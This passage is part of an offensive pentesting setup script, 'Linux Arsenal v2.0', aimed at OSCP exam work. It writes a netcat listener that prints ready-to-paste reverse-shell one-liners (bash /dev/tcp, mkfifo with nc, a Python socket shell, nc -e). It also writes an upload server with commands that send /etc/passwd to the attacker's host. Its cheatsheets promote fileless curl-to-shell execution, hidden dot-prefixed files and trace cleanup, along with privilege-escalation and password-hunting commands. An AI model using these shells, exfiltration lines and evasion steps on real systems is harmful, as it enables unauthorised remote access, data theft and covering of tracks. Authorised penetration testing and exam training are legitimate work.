    ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
    ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
    hostname -I 2>/dev/null | awk '{print $1}' || \
    echo "127.0.0.1"
}

HTTP_PORT=""
if [ -f "${PORT_FILE}" ]; then
    HTTP_PORT=$(cat "${PORT_FILE}" 2>/dev/null)
fi

PORT="${1:-4444}"

if ! is_port_free $PORT; then
    echo "[!] Port $PORT in use"
    for try_port in 4444 4445 4446 9001 9002 5555 6666 7777 8888; do
        if [ "$try_port" != "$HTTP_PORT" ] && is_port_free $try_port; then
            PORT=$try_port
            echo "[+] Using port $PORT"
            break
        fi
    done
fi

IP=$(get_ip)

cat << EOF

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  SMART LISTENER - @mahdiesta
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Listening: ${IP}:${PORT}

  Reverse Shell Commands (copy to target):

  bash -i >& /dev/tcp/${IP}/${PORT} 0>&1

  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${IP} ${PORT} >/tmp/f

  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${IP}",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

  nc ${IP} ${PORT} -e /bin/bash

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Waiting for connection...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

EOF

nc -lvnp ${PORT}
EOF
    chmod +x "${TOOLS_DIR}/listen.sh"
    
    # Upload server
    cat > "${TOOLS_DIR}/upload.sh" << 'EOF'
#!/bin/bash
#=============================================================================
# Upload Server - Receive files from target
# Enhanced by @mahdiesta
#=============================================================================

PORT="${1:-8080}"
UPLOAD_DIR="${2:-.}"

IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')

mkdir -p "$UPLOAD_DIR" 2>/dev/null

cat << EOF

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  UPLOAD SERVER - @mahdiesta
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Listening: ${IP}:${PORT}
  Save to:   $(realpath $UPLOAD_DIR)

  Upload from target:

  curl -X POST -F 'file=@/etc/passwd' http://${IP}:${PORT}/upload

  cat /etc/passwd | nc ${IP} ${PORT}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

EOF

python3 << PYEOF
import http.server
import socketserver
import cgi
import os

class UploadHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_type = self.headers.get('Content-Type', '')
        
        if 'multipart/form-data' in content_type:
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={'REQUEST_METHOD': 'POST'}
            )
            if 'file' in form:
                file_item = form['file']
                filename = os.path.basename(file_item.filename)
                filepath = os.path.join('${UPLOAD_DIR}', filename)
                with open(filepath, 'wb') as f:
                    f.write(file_item.file.read())
                print(f"[✓] Received: {filename}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(f"Uploaded: {filename}".encode())
                return
        
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        filename = f"upload_{os.urandom(4).hex()}.txt"
        filepath = os.path.join('${UPLOAD_DIR}', filename)
        with open(filepath, 'wb') as f:
            f.write(body)
        print(f"[✓] Received: {filename}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(f"Uploaded: {filename}".encode())

with socketserver.TCPServer(("", ${PORT}), UploadHandler) as httpd:
    print(f"[*] Waiting for uploads...")
    httpd.serve_forever()
PYEOF
EOF
    chmod +x "${TOOLS_DIR}/upload.sh"

    log "INFO" "Created enhanced server scripts"
}

#=============================================================================
# DOCUMENTATION
#=============================================================================

create_cheatsheets() {
    log "HEADER" "Creating Documentation"
    
    local cheat="${TOOLS_DIR}/cheatsheets"
    
    cat > "${cheat}/README.md" << 'EOF'
# Linux Arsenal v2.0 - Enhanced Edition
## Author: @mahdiesta

## Quick Start

```bash
# Start smart HTTP server
./serve.sh

# Start listener (auto-avoids HTTP port)
./listen.sh

# Upload server
./upload.sh 8080
```

## Smart One-Liners

All one-liners automatically:
- Find writable directories (/tmp, /dev/shm, /var/tmp, home)
- Download and execute with proper permissions
- Use hidden filenames (dot-prefixed)
- Clean up after execution
- Work without hardcoded paths

## OSCP Workflow

1. Start server: `./serve.sh`
2. Copy one-liner from server output
3. Paste on target (auto-finds writable dir)
4. Run linpeas first → look for RED/YELLOW
5. Run pspy → find cron jobs
6. Use command generators → get exploit commands
7. Run commands MANUALLY
8. Document everything

## Tool Categories

### Enumeration (Primary)
- linpeas.sh - Comprehensive (USE FIRST)
- lse.sh - Smart enumeration with levels
- LinEnum.sh - Classic enumeration

### Process Monitoring (Critical for Cron)
- pspy64/pspy32 - Monitor processes without root

### Command Generators (OSCP Safe)
- suid3num.py - SUID + GTFOBins commands
- gtfonow.py - Use -l 0 only!
- traitor - Find vulns (no -a flag)

### Exploit Suggesters
- linux-exploit-suggester.sh
- linux-exploit-suggester-2.pl

### Tunneling
- chisel - SOCKS proxy
- ligolo-ng - Layer 3 tunnel

### Static Binaries
- bash, ncat, socat, curl, nmap
- For restricted shells

## Smart Features

### Auto-Detection
One-liners automatically detect:
- Writable directories
- Available download tools (curl/wget)
- Execution permissions
- Cleanup on completion

### Memory Execution
No files on disk:
```bash
curl -sL http://IP:PORT/enumeration/linpeas.sh | sh
```

### Hidden Files
Uses dot-prefixed filenames:
- `.lp.$$` (linpeas)
- `.pspy.$$` (pspy)
- `.suid.$$` (suid3num)

### Auto Cleanup
Files removed after execution using `$$` (process ID)

## Enhanced by @mahdiesta
EOF

    cat > "${cheat}/PRIVESC-QUICK.md" << 'EOF'
# Privilege Escalation Quick Reference

## Manual Checks (Always Run First)

```bash
# System info
uname -a
cat /etc/os-release
id; groups

# Sudo
sudo -l
sudo -V

# SUID/SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Network
netstat -tulpn 2>/dev/null || ss -tulpn

# Passwords
grep -r "password" /etc/ 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
```

## Automated Tools Order

1. LinPEAS (comprehensive)
2. pspy (cron monitoring - run 2-5 minutes)
3. suid3num (SUID + commands)
4. linux-exploit-suggester (kernel)
5. Manual verification

## Quick Wins Checklist

- [ ] `sudo -l` - NOPASSWD entries?
- [ ] SUID binaries → GTFOBins
- [ ] Capabilities → GTFOBins
- [ ] Kernel exploits
- [ ] Cron jobs (pspy!)
- [ ] Writable /etc/passwd
- [ ] Password reuse
- [ ] Internal services
- [ ] NFS no_root_squash
- [ ] Docker/LXC groups

## OSCP Rules

**ALLOWED:**
- Tools showing exploit commands
- Running commands manually
- Understanding what you're doing

**NOT ALLOWED:**
- Auto-exploitation tools
- gtfonow -l 1 or higher
- traitor -a or -e
- Any automatic exploitation

## Enhanced by @mahdiesta
EOF

    log "INFO" "Created documentation"
}

#=============================================================================
# CLEANUP & SUMMARY
#=============================================================================

cleanup() {
    log "HEADER" "Cleaning Up"
    
    rm -rf "${TEMP_DIR}" 2>/dev/null
    find "${TOOLS_DIR}" -type d -empty -delete 2>/dev/null
    chmod +x "${TOOLS_DIR}"/*.sh 2>/dev/null
    
    log "INFO" "Cleanup complete"
}

print_summary() {
    local IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')
    
    cat << EOF

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  DOWNLOAD COMPLETE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Tools Directory: ${TOOLS_DIR}
  Your IP:         ${IP}
  Version:         ${VERSION}
  Author:          ${AUTHOR}

━━━ QUICK START ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Start HTTP Server (shows smart one-liners):
    cd ${TOOLS_DIR} && ./serve.sh

  Start Listener (auto-avoids HTTP port):
    ./listen.sh

  Upload Server (receive files from target):
    ./upload.sh 8080

━━━ KEY FILES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  cheatsheets/README.md          - Overview and usage
  cheatsheets/PRIVESC-QUICK.md   - PrivEsc quick reference

━━━ SMART FEATURES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ✓ Auto-detect writable directories
  ✓ Memory execution (no disk files)
  ✓ Hidden filenames (dot-prefixed)
  ✓ Auto cleanup after execution
  ✓ Fallback download methods
  ✓ OSCP-compliant (no auto-exploit)

━━━ OSCP WORKFLOW ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  1. Start server:  ./serve.sh
  2. Copy one-liner from output (auto-finds writable dir)
  3. Run linpeas → check RED/YELLOW
  4. Run pspy → find cron jobs (2-5 minutes)
  5. Use command generators → get exploit commands
  6. Run commands MANUALLY
  7. Document everything

━━━ ENHANCED BY @mahdiesta ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Ready. Run: cd ${TOOLS_DIR} && ./serve.sh

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

EOF
}

#=============================================================================
# MAIN
#=============================================================================

main() {
    echo -e "${C}"
    cat << 'EOF'
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  LINUX ARSENAL v2.0 - Enhanced Edition
  Smart Pentesting Tools with Intelligent One-liners
  Author: @mahdiesta
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EOF
    echo -e "${NC}"
    
    log "INFO" "Starting Linux Arsenal - Target: ${TOOLS_DIR}"
    
    check_dependencies
    create_directories
    download_enumeration_scripts
    download_privesc_tools
    download_tunneling_tools
    download_shells_and_transfer
    download_static_binaries
    download_network_tools
    clone_useful_repos
    create_cheatsheets
    create_server_scripts
    cleanup
    
    print_summary
}

main "$@"
